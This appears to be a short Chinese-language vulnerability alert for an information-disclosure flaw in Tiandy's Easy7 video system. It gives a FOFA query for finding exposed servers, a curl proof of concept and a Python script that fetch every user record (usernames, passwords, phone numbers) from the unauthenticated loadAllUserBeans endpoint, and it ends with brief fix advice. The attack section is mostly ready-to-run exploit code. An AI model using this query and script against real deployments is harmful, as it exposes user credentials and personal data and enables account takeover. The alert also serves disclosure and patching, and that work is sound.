---
title: 【漏洞预警】天地伟业Easy7 loadAllUserBeans 敏感信息泄露
---

## 漏洞概述
天地伟业Easy7系统loadAllUserBeans接口存在敏感信息泄露漏洞，攻击者可直接获取系统用户敏感信息。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 天地伟业Easy7 loadAllUserBeans接口敏感信息泄露 |
| 漏洞类型 | 敏感信息泄露 |
| 影响组件 | loadAllUserBeans |
| 严重程度 | 中危 |

## FOFA查询
```
app="Tiandy-Easy7"
```

## POC
```bash
# 获取所有用户信息
curl "http://target/Easy7/rest/user/loadAllUserBeans"

# 响应包含用户敏感信息（用户名、密码、手机号等）
```

Python脚本:
```python
import requests
import json

url = "http://target/Easy7/rest/user/loadAllUserBeans"
r = requests.get(url)
data = r.json()
print(json.dumps(data, indent=2, ensure_ascii=False))
```

## 修复建议
1. 升级到最新版本
2. 增加接口认证
3. 限制敏感信息访问